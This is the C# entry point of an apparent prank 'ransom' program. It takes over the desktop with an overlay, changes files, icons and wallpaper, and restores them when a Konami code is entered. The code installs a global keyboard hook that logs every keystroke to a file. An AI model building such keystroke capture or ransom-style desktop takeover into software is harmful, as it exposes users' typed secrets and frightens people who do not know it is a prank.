using System.Diagnostics;
using System.Runtime.InteropServices;

namespace rans0m
{
    internal static class Program
    {
        private static KeyboardHook keyboardHook = new KeyboardHook();

        [STAThread]
        static void Main()
        {
            FileLogger.Clear();
            FileLogger.Log("=== RANSOM START ===");
            Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
            Application.ThreadException += (sender, e) =>
            {
                FileLogger.Log($"[Program] ThreadException: {e.Exception}");
            };
            AppDomain.CurrentDomain.UnhandledException += (s, e) =>
            {
                FileLogger.Log($"[Program] Unhandled: {e.ExceptionObject}");
            };

            ApplicationConfiguration.Initialize();
            // Global.AttemptForceAdmin(); Disabled - causes drag&drop issues and UAC

            // Auto-restore if previous run was force-stopped and left restore.json (file ops revert, icons, wallpaper)
            try { DesktopRansomManager.TryRestoreIfNeeded(); } catch (Exception ex) { Debug.WriteLine($"[Program] RestoreIfNeeded fail: {ex.Message}"); }
            // Ensure gif placeholder exists for future ransom
            try { DesktopRansomManager.EnsureGifExists(); } catch { }

            // Hook global keys for movement detection and Konami code
            keyboardHook.KeyPressed += Global.KeyPressed;
            keyboardHook.KeyPressed += (k) => FileLogger.Log($"[Key] {k}");
            // Konami+Shift (Up Up Down Down Left Right Left Right B A Shift) -> win + STOP EXE
            KonamiCodeDetector.CodeEntered += () =>
            {
                FileLogger.Log("[Program] Konami code detected - triggering WIN + STOP EXE");
                try
                {
                    var form = Application.OpenForms.Cast<Form>().FirstOrDefault(f => f is Overlay);
                    if (form != null)
                    {
                        // Trigger win (restore files/icons) then close
                        try
                        {
                            if (form.InvokeRequired)
                                form.Invoke(() => Global.TriggerKonamiWin());
                            else Global.TriggerKonamiWin();
                        }
                        catch { }
                        // Give win a moment to restore, then stop exe
                        Task.Delay(800).ContinueWith(_ =>
                        {
                            FileLogger.Log("[Konami] Stopping exe after win");
                            try { DesktopRansomManager.TryRestore(); } catch { }
                            try { GoldCoinManager.DeleteAllCoins(); } catch { }
                            Environment.Exit(0);
                        });
                    }
                    else
                    {
                        try { Global.TriggerKonamiWin(); } catch { }
                        Environment.Exit(0);
                    }
                }
                catch (Exception ex) { FileLogger.Log($"[Konami] win trigger err: {ex.Message}"); try { Environment.Exit(0); } catch { } }
            };

            try { keyboardHook.Hook(); FileLogger.Log("[Program] Hook installed"); } catch (Exception ex) { FileLogger.Log($"[Program] Hook failed: {ex.Message}"); }

            // Cleanup orphaned gold files from previous crash (if any) - but don't delete if currently under ransom?
            // Only clean if not already tracking coins? We'll clean on startup to avoid leaks from killed process
            // But safe version: don't auto-clean on startup if registry already has coins - could be mid-game after explorer restart
            // So we skip auto-clean; Delete will happen on next ResetRansom

            Application.Run(new Overlay());

            try { keyboardHook.Unhook(); } catch { }
            KonamiCodeDetector.CodeEntered -= () => Global.TriggerKonamiWin();
            keyboardHook.Dispose();
        }
    }
}
